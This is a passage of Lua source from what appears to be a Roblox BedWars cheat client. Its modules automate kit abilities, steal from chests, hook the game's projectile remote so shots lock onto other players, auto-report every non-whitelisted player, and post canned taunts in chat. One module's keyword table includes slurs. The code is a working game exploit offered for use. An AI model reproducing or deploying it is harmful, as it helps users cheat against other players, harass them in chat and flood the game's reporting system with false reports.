										if entityLibrary.isAlive and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 20 then
											bedwars.ClientHandler:Get(bedwars.PickupMetalRemote):SendToServer({
												id = v:GetAttribute("Id")
											}) 
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "battery" then 
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = bedwars.BatteryEffectController.liveBatteries
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.position).magnitude <= 10 then
											bedwars.ClientHandler:Get(bedwars.BatteryRemote):SendToServer({
												batteryId = i
											})
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "grim_reaper" then
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = bedwars.GrimReaperController.soulsByPosition
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and lplr.Character:GetAttribute("Health") <= (lplr.Character:GetAttribute("MaxHealth") / 4) and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 120 and (not lplr.Character:GetAttribute("GrimReaperChannel")) then
											bedwars.ClientHandler:Get(bedwars.ConsumeSoulRemote):CallServer({
												secret = v:GetAttribute("GrimReaperSoulSecret")
											})
											v:Destroy()
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "farmer_cletus" then 
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = collectionService:GetTagged("BedwarsHarvestableCrop")
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.Position).magnitude <= 10 then
											bedwars.ClientHandler:Get("BedwarsHarvestCrop"):CallServerAsync({
												position = bedwars.BlockController:getBlockPosition(v.Position)
											}):andThen(function(suc)
												if suc then
													bedwars.GameAnimationUtil.playAnimation(lplr.Character, 1)
													bedwars.SoundManager:playSound(bedwars.SoundList.CROP_HARVEST)
												end
											end)
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "dragon_slayer" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i,v in pairs(bedwars.DragonSlayerController.dragonEmblems) do 
											if v.stackCount >= 3 then 
												bedwars.DragonSlayerController:deleteEmblem(i)
												local localPos = lplr.Character:GetPrimaryPartCFrame().Position
												local punchCFrame = CFrame.new(localPos, (i:GetPrimaryPartCFrame().Position * Vector3.new(1, 0, 1)) + Vector3.new(0, localPos.Y, 0))
												lplr.Character:SetPrimaryPartCFrame(punchCFrame)
												bedwars.DragonSlayerController:playPunchAnimation(punchCFrame - punchCFrame.Position)
												bedwars.ClientHandler:Get(bedwars.DragonRemote):SendToServer({
													target = i
												})
											end
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "mage" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i, v in pairs(collectionService:GetTagged("TomeGuidingBeam")) do 
											local obj = v.Parent and v.Parent.Parent and v.Parent.Parent.Parent
											if obj and (entityLibrary.character.HumanoidRootPart.Position - obj.PrimaryPart.Position).Magnitude < 5 and obj:GetAttribute("TomeSecret") then
												local res = bedwars.ClientHandler:Get(bedwars.MageRemote):CallServer({
													secret = obj:GetAttribute("TomeSecret")
												})
												if res.success and res.element then 
													bedwars.GameAnimationUtil.playAnimation(lplr, bedwars.AnimationType.PUNCH)
													bedwars.ViewmodelController:playAnimation(bedwars.AnimationType.FP_USE_ITEM)
													bedwars.MageController:destroyTomeGuidingBeam()
													bedwars.MageController:playLearnLightBeamEffect(lplr, obj)
													local sound = bedwars.MageKitUtil.MageElementVisualizations[res.element].learnSound
													if sound and sound ~= "" then 
														bedwars.SoundManager:playSound(sound)
													end
													task.delay(bedwars.BalanceFile.LEARN_TOME_DURATION, function()
														bedwars.MageController:fadeOutTome(obj)
														if lplr.Character and res.element then
															bedwars.MageKitUtil.changeMageKitAppearance(lplr, lplr.Character, res.element)	
														end
													end)
												end
											end
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "angel" then 
							table.insert(AutoKit.Connections, vapeEvents.AngelProgress.Event:Connect(function(angelTable)
								task.wait(0.5)
								if not AutoKit.Enabled then return end
								if bedwars.ClientStoreHandler:getState().Kit.angelProgress >= 1 and lplr.Character:GetAttribute("AngelType") == nil then
									bedwars.ClientHandler:Get(bedwars.TrinityRemote):SendToServer({
										angel = AutoKitTrinity.Value
									})
								end
							end))
						elseif bedwarsStore.equippedKit == "miner" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i,v in pairs(collectionService:GetTagged("petrified-player")) do 
											bedwars.ClientHandler:Get(bedwars.MinerRemote):SendToServer({
												petrifyId = v:GetAttribute("PetrifyId")
											})
										end
									end
								until (not AutoKit.Enabled)
							end)
						end
					end
				end)
			else
				bedwars.FishermanTable.startMinigame = oldfish
				oldfish = nil
			end
		end,
		HoverText = "Automatically uses a kits ability"
	})
	AutoKitTrinity = AutoKit.CreateDropdown({
		Name = "Angel",
		List = {"Void", "Light"},
		Function = function() end
	})
end)

runFunction(function()
	local AutoRelicCustom = {ObjectList = {}}

	local function findgoodmeta(relics)
		local tab = #AutoRelicCustom.ObjectList > 0 and AutoRelicCustom.ObjectList or {
			"embers_anguish",
			"knights_code",
			"quick_forge",
			"glass_cannon"
		}
		for i,v in pairs(relics) do 
			for i2,v2 in pairs(tab) do 
				if v.relic == v2 then
					return v.relic
				end
			end
		end
		return relics[1].relic
	end

	local AutoRelic = {Enabled = false}
	AutoRelic = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoRelic",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						if bedwars.AppController:isAppOpen("RelicVotingInterface") then 
							bedwars.AppController:closeApp("RelicVotingInterface")
							local relictable = bedwars.ClientStoreHandler:getState().Bedwars.relic.voteState
							if relictable then 
								bedwars.RelicController:voteForRelic(findgoodmeta(relictable))
							end
							break
						end
						if matchState ~= 0 then break end
					until (not AutoRelic.Enabled)
				end)
			end
		end
	})
	AutoRelicCustom = AutoRelic.CreateTextList({
		Name = "Custom",
		TempText = "custom (relic id)"
	})
end)

runFunction(function()
	local AutoForge = {Enabled = false}
	local AutoForgeWeapon = {Value = "Sword"}
	local AutoForgeBow = {Enabled = false}
	local AutoForgeArmor = {Enabled = false}
	local AutoForgeSword = {Enabled = false}
	local AutoForgeBuyAfter = {Enabled = false}
	local AutoForgeNotification = {Enabled = true}

	local function buyForge(i)
		if not bedwarsStore.forgeUpgrades[i] or bedwarsStore.forgeUpgrades[i] < 6 then
			local cost = bedwars.ForgeUtil:getUpgradeCost(1, bedwarsStore.forgeUpgrades[i] or 0)
			if bedwarsStore.forgeMasteryPoints >= cost then 
				if AutoForgeNotification.Enabled then
					local forgeType = "none"
					for name,v in pairs(bedwars.ForgeConstants) do
						if v == i then forgeType = name:lower() end
					end
					warningNotification("AutoForge", "Purchasing "..forgeType..".", bedwars.ForgeUtil.FORGE_DURATION_SEC)
				end
				bedwars.ClientHandler:Get("ForgePurchaseUpgrade"):SendToServer(i)
				task.wait(bedwars.ForgeUtil.FORGE_DURATION_SEC + 0.2)
			end
		end
	end

	AutoForge = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoForge",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						if bedwarsStore.matchState == 1 and entityLibrary.isAlive then
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeArmor.Enabled then buyForge(bedwars.ForgeConstants.ARMOR) end
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeBow.Enabled then buyForge(bedwars.ForgeConstants.RANGED) end
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeSword.Enabled then
								if AutoForgeBuyAfter.Enabled then
									if not bedwarsStore.forgeUpgrades[bedwars.ForgeConstants.ARMOR] or bedwarsStore.forgeUpgrades[bedwars.ForgeConstants.ARMOR] < 6 then continue end
								end
								local weapon = bedwars.ForgeConstants[AutoForgeWeapon.Value:upper()]
								if weapon then buyForge(weapon) end
							end
						end
					until (not AutoForge.Enabled)
				end)
			end
		end
	})
	AutoForgeWeapon = AutoForge.CreateDropdown({
		Name = "Weapon",
		Function = function() end,
		List = {"Sword", "Dagger", "Scythe", "Great_Hammer"}
	})
	AutoForgeArmor = AutoForge.CreateToggle({
		Name = "Armor",
		Function = function() end,
		Default = true
	})
	AutoForgeSword = AutoForge.CreateToggle({
		Name = "Weapon",
		Function = function() end
	})
	AutoForgeBow = AutoForge.CreateToggle({
		Name = "Bow",
		Function = function() end
	})
	AutoForgeBuyAfter = AutoForge.CreateToggle({
		Name = "Buy After",
		Function = function() end,
		HoverText = "buy a weapon after armor is maxed"
	})
	AutoForgeNotification = AutoForge.CreateToggle({
		Name = "Notification",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local alreadyreportedlist = {}
	local AutoReportV2 = {Enabled = false}
	local AutoReportV2Notify = {Enabled = false}
	AutoReportV2 = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoReportV2",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						for i,v in pairs(playersService:GetPlayers()) do 
							if v ~= lplr and alreadyreportedlist[v] == nil and v:GetAttribute("PlayerConnected") and WhitelistFunctions:GetWhitelist(v) == 0 then 
								task.wait(1)
								alreadyreportedlist[v] = true
								bedwars.ClientHandler:Get(bedwars.ReportRemote):SendToServer(v.UserId)
								bedwarsStore.statistics.reported = bedwarsStore.statistics.reported + 1
								if AutoReportV2Notify.Enabled then 
									warningNotification("AutoReportV2", "Reported "..v.Name, 15)
								end
							end
						end
					until (not AutoReportV2.Enabled)
				end)
			end	
		end,
		HoverText = "dv mald"
	})
	AutoReportV2Notify = AutoReportV2.CreateToggle({
		Name = "Notify",
		Function = function() end
	})
end)

runFunction(function()
	local justsaid = ""
	local leavesaid = false
	local alreadyreported = {}

	local function removerepeat(str)
		local newstr = ""
		local lastlet = ""
		for i,v in pairs(str:split("")) do 
			if v ~= lastlet then
				newstr = newstr..v 
				lastlet = v
			end
		end
		return newstr
	end

	local reporttable = {
		gay = "Bullying",
		gae = "Bullying",
		gey = "Bullying",
		hack = "Scamming",
		exploit = "Scamming",
		cheat = "Scamming",
		hecker = "Scamming",
		haxker = "Scamming",
		hacer = "Scamming",
		report = "Bullying",
		fat = "Bullying",
		black = "Bullying",
		getalife = "Bullying",
		fatherless = "Bullying",
		report = "Bullying",
		fatherless = "Bullying",
		disco = "Offsite Links",
		yt = "Offsite Links",
		dizcourde = "Offsite Links",
		retard = "Swearing",
		bad = "Bullying",
		trash = "Bullying",
		nolife = "Bullying",
		nolife = "Bullying",
		loser = "Bullying",
		killyour = "Bullying",
		kys = "Bullying",
		hacktowin = "Bullying",
		bozo = "Bullying",
		kid = "Bullying",
		adopted = "Bullying",
		linlife = "Bullying",
		commitnotalive = "Bullying",
		vape = "Offsite Links",
		futureclient = "Offsite Links",
		download = "Offsite Links",
		youtube = "Offsite Links",
		die = "Bullying",
		lobby = "Bullying",
		ban = "Bullying",
		wizard = "Bullying",
		wisard = "Bullying",
		witch = "Bullying",
		magic = "Bullying",
	}
	local reporttableexact = {
		L = "Bullying",
	}
	

	local function findreport(msg)
		local checkstr = removerepeat(msg:gsub("%W+", ""):lower())
		for i,v in pairs(reporttable) do 
			if checkstr:find(i) then 
				return v, i
			end
		end
		for i,v in pairs(reporttableexact) do 
			if checkstr == i then 
				return v, i
			end
		end
		for i,v in pairs(AutoToxicPhrases5.ObjectList) do 
			if checkstr:find(v) then 
				return "Bullying", v
			end
		end
		return nil
	end

	AutoToxic = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoToxic",
		Function = function(callback)
			if callback then 
				table.insert(AutoToxic.Connections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
					if AutoToxicBedDestroyed.Enabled and bedTable.brokenBedTeam.id == lplr:GetAttribute("Team") then
						local custommsg = #AutoToxicPhrases6.ObjectList > 0 and AutoToxicPhrases6.ObjectList[math.random(1, #AutoToxicPhrases6.ObjectList)] or "How dare you break my bed >:( <name> | vxpe on top"
						if custommsg then
							custommsg = custommsg:gsub("<name>", (bedTable.player.DisplayName or bedTable.player.Name))
						end
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
					elseif AutoToxicBedBreak.Enabled and bedTable.player.UserId == lplr.UserId then
						local custommsg = #AutoToxicPhrases7.ObjectList > 0 and AutoToxicPhrases7.ObjectList[math.random(1, #AutoToxicPhrases7.ObjectList)] or "nice bed <teamname> | vxpe on top"
						if custommsg then
							local team = bedwars.QueueMeta[bedwarsStore.queueType].teams[tonumber(bedTable.brokenBedTeam.id)]
							local teamname = team and team.displayName:lower() or "white"
							custommsg = custommsg:gsub("<teamname>", teamname)
						end
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
					if deathTable.finalKill then
						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
						if not killed or not killer then return end
						if killed == lplr then 
							if (not leavesaid) and killer ~= lplr and AutoToxicDeath.Enabled then
								leavesaid = true
								local custommsg = #AutoToxicPhrases3.ObjectList > 0 and AutoToxicPhrases3.ObjectList[math.random(1, #AutoToxicPhrases3.ObjectList)] or "My gaming chair expired midfight, thats why you won <name> | vxpe on top"
								if custommsg then
									custommsg = custommsg:gsub("<name>", (killer.DisplayName or killer.Name))
								end
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
							end
						else
							if killer == lplr and AutoToxicFinalKill.Enabled then 
								local custommsg = #AutoToxicPhrases2.ObjectList > 0 and AutoToxicPhrases2.ObjectList[math.random(1, #AutoToxicPhrases2.ObjectList)] or "L <name> | vxpe on top"
								if custommsg == lastsaid then
									custommsg = #AutoToxicPhrases2.ObjectList > 0 and AutoToxicPhrases2.ObjectList[math.random(1, #AutoToxicPhrases2.ObjectList)] or "L <name> | vxpe on top"
								else
									lastsaid = custommsg
								end
								if custommsg then
									custommsg = custommsg:gsub("<name>", (killed.DisplayName or killed.Name))
								end
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
							end
						end
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
						if AutoToxicGG.Enabled then
							textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("gg")
							if shared.ggfunction then
								shared.ggfunction()
							end
						end
						if AutoToxicWin.Enabled then
							textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(#AutoToxicPhrases.ObjectList > 0 and AutoToxicPhrases.ObjectList[math.random(1, #AutoToxicPhrases.ObjectList)] or "EZ L TRASH KIDS | vxpe on top")
						end
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.LagbackEvent.Event:Connect(function(plr)
					if AutoToxicLagback.Enabled then
						local custommsg = #AutoToxicPhrases8.ObjectList > 0 and AutoToxicPhrases8.ObjectList[math.random(1, #AutoToxicPhrases8.ObjectList)]
						if custommsg then
							custommsg = custommsg:gsub("<name>", (plr.DisplayName or plr.Name))
						end
						local msg = custommsg or "Imagine lagbacking L "..(plr.DisplayName or plr.Name).." | vxpe on top"
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
					end
				end))
				table.insert(AutoToxic.Connections, textChatService.MessageReceived:Connect(function(tab)
					if AutoToxicRespond.Enabled then
						local plr = playersService:GetPlayerByUserId(tab.TextSource.UserId)
						local args = tab.Text:split(" ")
						if plr and plr ~= lplr and not alreadyreported[plr] then
							local reportreason, reportedmatch = findreport(tab.Text)
							if reportreason then 
								alreadyreported[plr] = true
								local custommsg = #AutoToxicPhrases4.ObjectList > 0 and AutoToxicPhrases4.ObjectList[math.random(1, #AutoToxicPhrases4.ObjectList)]
								if custommsg then
									custommsg = custommsg:gsub("<name>", (plr.DisplayName or plr.Name))
								end
								local msg = custommsg or "I don't care about the fact that I'm hacking, I care about you dying in a block game. L "..(plr.DisplayName or plr.Name).." | vxpe on top"
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
							end
						end
					end
				end))
			end
		end
	})
	AutoToxicGG = AutoToxic.CreateToggle({
		Name = "AutoGG",
		Function = function() end, 
		Default = true
	})
	AutoToxicWin = AutoToxic.CreateToggle({
		Name = "Win",
		Function = function() end, 
		Default = true
	})
	AutoToxicDeath = AutoToxic.CreateToggle({
		Name = "Death",
		Function = function() end, 
		Default = true
	})
	AutoToxicBedBreak = AutoToxic.CreateToggle({
		Name = "Bed Break",
		Function = function() end, 
		Default = true
	})
	AutoToxicBedDestroyed = AutoToxic.CreateToggle({
		Name = "Bed Destroyed",
		Function = function() end, 
		Default = true
	})
	AutoToxicRespond = AutoToxic.CreateToggle({
		Name = "Respond",
		Function = function() end, 
		Default = true
	})
	AutoToxicFinalKill = AutoToxic.CreateToggle({
		Name = "Final Kill",
		Function = function() end, 
		Default = true
	})
	AutoToxicTeam = AutoToxic.CreateToggle({
		Name = "Teammates",
		Function = function() end, 
	})
	AutoToxicLagback = AutoToxic.CreateToggle({
		Name = "Lagback",
		Function = function() end, 
		Default = true
	})
	AutoToxicPhrases = AutoToxic.CreateTextList({
		Name = "ToxicList",
		TempText = "phrase (win)",
	})
	AutoToxicPhrases2 = AutoToxic.CreateTextList({
		Name = "ToxicList2",
		TempText = "phrase (kill) <name>",
	})
	AutoToxicPhrases3 = AutoToxic.CreateTextList({
		Name = "ToxicList3",
		TempText = "phrase (death) <name>",
	})
	AutoToxicPhrases7 = AutoToxic.CreateTextList({
		Name = "ToxicList7",
		TempText = "phrase (bed break) <teamname>",
	})
	AutoToxicPhrases7.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases6 = AutoToxic.CreateTextList({
		Name = "ToxicList6",
		TempText = "phrase (bed destroyed) <name>",
	})
	AutoToxicPhrases6.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases4 = AutoToxic.CreateTextList({
		Name = "ToxicList4",
		TempText = "phrase (text to respond with) <name>",
	})
	AutoToxicPhrases4.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases5 = AutoToxic.CreateTextList({
		Name = "ToxicList5",
		TempText = "phrase (text to respond to)",
	})
	AutoToxicPhrases5.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases8 = AutoToxic.CreateTextList({
		Name = "ToxicList8",
		TempText = "phrase (lagback) <name>",
	})
	AutoToxicPhrases8.Object.AddBoxBKG.AddBox.TextSize = 12
end)

runFunction(function()
	local ChestStealer = {Enabled = false}
	local ChestStealerDistance = {Value = 1}
	local ChestStealerDelay = {Value = 1}
	local ChestStealerOpen = {Enabled = false}
	local ChestStealerSkywars = {Enabled = true}
	local cheststealerdelays = {}
	local cheststealerfuncs = {
		Open = function()
			if bedwars.AppController:isAppOpen("ChestApp") then
				local chest = lplr.Character:FindFirstChild("ObservedChestFolder")
				local chestitems = chest and chest.Value and chest.Value:GetChildren() or {}
				if #chestitems > 0 then
					for i3,v3 in pairs(chestitems) do
						if v3:IsA("Accessory") and (cheststealerdelays[v3] == nil or cheststealerdelays[v3] < tick()) then
							task.spawn(function()
								pcall(function()
									cheststealerdelays[v3] = tick() + 0.2
									bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(chest.Value, v3)
								end)
							end)
							task.wait(ChestStealerDelay.Value / 100)
						end
					end
				end
			end
		end,
		Closed = function()
			for i, v in pairs(collectionService:GetTagged("chest")) do
				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= ChestStealerDistance.Value then
					local chest = v:FindFirstChild("ChestFolderValue")
					chest = chest and chest.Value or nil
					local chestitems = chest and chest:GetChildren() or {}
					if #chestitems > 0 then
						bedwars.ClientHandler:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(chest)
						for i3,v3 in pairs(chestitems) do
							if v3:IsA("Accessory") then
								task.spawn(function()
									pcall(function()
										bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(v.ChestFolderValue.Value, v3)
									end)
								end)
								task.wait(ChestStealerDelay.Value / 100)
							end
						end
						bedwars.ClientHandler:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(nil)
					end
				end
			end
		end
	}

	ChestStealer = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ChestStealer",
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat task.wait() until bedwarsStore.queueType ~= "bedwars_test"
					if (not ChestStealerSkywars.Enabled) or bedwarsStore.queueType:find("skywars") then
						repeat 
							task.wait(0.1)
							if entityLibrary.isAlive then
								cheststealerfuncs[ChestStealerOpen.Enabled and "Open" or "Closed"]()
							end
						until (not ChestStealer.Enabled)
					end
				end)
			end
		end,
		HoverText = "Grabs items from near chests."
	})
	ChestStealerDistance = ChestStealer.CreateSlider({
		Name = "Range",
		Min = 0,
		Max = 18,
		Function = function() end,
		Default = 18
	})
	ChestStealerDelay = ChestStealer.CreateSlider({
		Name = "Delay",
		Min = 1,
		Max = 50,
		Function = function() end,
		Default = 1,
		Double = 100
	})
	ChestStealerOpen = ChestStealer.CreateToggle({
		Name = "GUI Check",
		Function = function() end
	})
	ChestStealerSkywars = ChestStealer.CreateToggle({
		Name = "Only Skywars",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local FastDrop = {Enabled = false}
	FastDrop = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "FastDrop",
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat
						task.wait()
						if entityLibrary.isAlive and (not bedwarsStore.localInventory.opened) and (inputService:IsKeyDown(Enum.KeyCode.Q) or inputService:IsKeyDown(Enum.KeyCode.Backspace)) and inputService:GetFocusedTextBox() == nil then
							task.spawn(bedwars.DropItem)
						end
					until (not FastDrop.Enabled)
				end)
			end
		end,
		HoverText = "Drops items fast when you hold Q"
	})
end)

local denyregions = {}
runFunction(function()
	local ignoreplaceregions = {Enabled = false}
	ignoreplaceregions = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "IgnorePlaceRegions",
		Function = function(callback)
			if callback then
				denyregions = bedwars.MapController.denyRegions
				task.spawn(function()
					repeat
						bedwars.MapController.denyRegions = {}
						task.wait()
					until (not ignoreplaceregions.Enabled)
				end)
			else 
				bedwars.MapController.denyRegions = denyregions
			end
		end
	})
end)

runFunction(function()
	local MissileTP = {Enabled = false}
	local MissileTeleportDelaySlider = {Value = 30}
	MissileTP = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "MissileTP",
		Function = function(callback)
			if callback then
				task.spawn(function()
					if getItem("guided_missile") then
						local plr = EntityNearMouse(1000)
						if plr then
							local projectile = bedwars.RuntimeLib.await(bedwars.MissileController.fireGuidedProjectile:CallServerAsync("guided_missile"))
							if projectile then
								local projectilemodel = projectile.model
								if not projectilemodel.PrimaryPart then
									projectilemodel:GetPropertyChangedSignal("PrimaryPart"):Wait()
								end;
								local bodyforce = Instance.new("BodyForce")
								bodyforce.Force = Vector3.new(0, projectilemodel.PrimaryPart.AssemblyMass * workspace.Gravity, 0)
								bodyforce.Name = "AntiGravity"
								bodyforce.Parent = projectilemodel.PrimaryPart

								repeat
									task.wait()
									if projectile.model then
										if plr then
											projectile.model:SetPrimaryPartCFrame(CFrame.new(plr.RootPart.CFrame.p, plr.RootPart.CFrame.p + gameCamera.CFrame.lookVector))
										else
											warningNotification("MissileTP", "Player died before it could TP.", 3)
											break
										end
									end
								until projectile.model.Parent == nil
							else
								warningNotification("MissileTP", "Missile on cooldown.", 3)
							end
						else
							warningNotification("MissileTP", "Player not found.", 3)
						end
					else
						warningNotification("MissileTP", "Missile not found.", 3)
					end
				end)
				MissileTP.ToggleButton(true)
			end
		end,
		HoverText = "Spawns and teleports a missile to a player\nnear your mouse."
	})
end)

runFunction(function()
	local OpenEnderchest = {Enabled = false}
	OpenEnderchest = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "OpenEnderchest",
		Function = function(callback)
			if callback then
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				if echest then
					bedwars.AppController:openApp("ChestApp", {})
					bedwars.ChestController:openChest(echest)
				else
					warningNotification("OpenEnderchest", "Enderchest not found", 5)
				end
				OpenEnderchest.ToggleButton(false)
			end
		end,
		HoverText = "Opens the enderchest"
	})
end)

runFunction(function()
	local PickupRangeRange = {Value = 1}
	local PickupRange = {Enabled = false}
	PickupRange = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "PickupRange", 
		Function = function(callback)
			if callback then
				local pickedup = {}
				task.spawn(function()
					repeat
						local itemdrops = collectionService:GetTagged("ItemDrop")
						for i,v in pairs(itemdrops) do
							if entityLibrary.isAlive and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
								if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) then
									task.spawn(function()
										pickedup[v] = tick() + 0.2
										bedwars.ClientHandler:Get(bedwars.PickupRemote):CallServerAsync({
											itemDrop = v
										}):andThen(function(suc)
											if suc then
												bedwars.SoundManager:playSound(bedwars.SoundList.PICKUP_ITEM_DROP)
											end
										end)
									end)
								end
							end
						end
						task.wait()
					until (not PickupRange.Enabled)
				end)
			end
		end
	})
	PickupRangeRange = PickupRange.CreateSlider({
		Name = "Range",
		Min = 1,
		Max = 10, 
		Function = function() end,
		Default = 10
	})
end)

runFunction(function()
	local BowExploit = {Enabled = false}
	local BowExploitTarget = {Value = "Mouse"}
	local BowExploitAutoShootFOV = {Value = 1000}
	local oldrealremote
	local noveloproj = {
		"fireball",
		"telepearl"
	}

	BowExploit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ProjectileExploit",
		Function = function(callback)
			if callback then 
				oldrealremote = bedwars.ClientConstructor.Function.new
				bedwars.ClientConstructor.Function.new = function(self, ind, ...)
					local res = oldrealremote(self, ind, ...)
					local oldRemote = res.instance
					if oldRemote and oldRemote.Name == bedwars.ProjectileRemote then 
						res.instance = {InvokeServer = function(self, shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...) 
							local plr
							if BowExploitTarget.Value == "Mouse" then 
								plr = EntityNearMouse(10000)
							else
								plr = EntityNearPosition(BowExploitAutoShootFOV.Value, true)
							end
							if plr then	
								if not ({WhitelistFunctions:GetWhitelist(plr.Player)})[2] then 
									return oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...)
								end
		
								tab1.drawDurationSeconds = 1
								repeat
									task.wait(0.03)
									local offsetStartPos = plr.RootPart.CFrame.p - plr.RootPart.CFrame.lookVector
									local pos = plr.RootPart.Position
									local playergrav = workspace.Gravity
									local balloons = plr.Character:GetAttribute("InflatedBalloons")
									if balloons and balloons > 0 then 
										playergrav = (workspace.Gravity * (1 - ((balloons >= 4 and 1.2 or balloons >= 3 and 1 or 0.975))))
									end
									if plr.Character.PrimaryPart:FindFirstChild("rbxassetid://8200754399") then 
										playergrav = (workspace.Gravity * 0.3)
									end
									local newLaunchVelo = bedwars.ProjectileMeta[proj2].launchVelocity
									local shootpos, shootvelo = predictGravity(pos, plr.RootPart.Velocity, (pos - offsetStartPos).Magnitude / newLaunchVelo, plr, playergrav)
									if proj2 == "telepearl" then
										shootpos = pos
										shootvelo = Vector3.zero
									end
									local newlook = CFrame.new(offsetStartPos, shootpos) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, -bedwars.BowConstantsTable.RelZ))
									shootpos = newlook.p + (newlook.lookVector * (offsetStartPos - shootpos).magnitude)
									local calculated = LaunchDirection(offsetStartPos, shootpos, newLaunchVelo, workspace.Gravity, false)
									if calculated then 
										launchvelo = calculated
										launchpos1 = offsetStartPos
										launchpos2 = offsetStartPos
										tab1.drawDurationSeconds = 1
									else
										break
									end
									if oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, workspace:GetServerTimeNow() - 0.045) then break end
								until false
							else
								return oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...)
							end
						end}
					end
					return res
				end
			else
				bedwars.ClientConstructor.Function.new = oldrealremote
				oldrealremote = nil
			end
		end
	})
	BowExploitTarget = BowExploit.CreateDropdown({
		Name = "Mode",
		List = {"Mouse", "Range"},
		Function = function() end
	})
	BowExploitAutoShootFOV = BowExploit.CreateSlider({
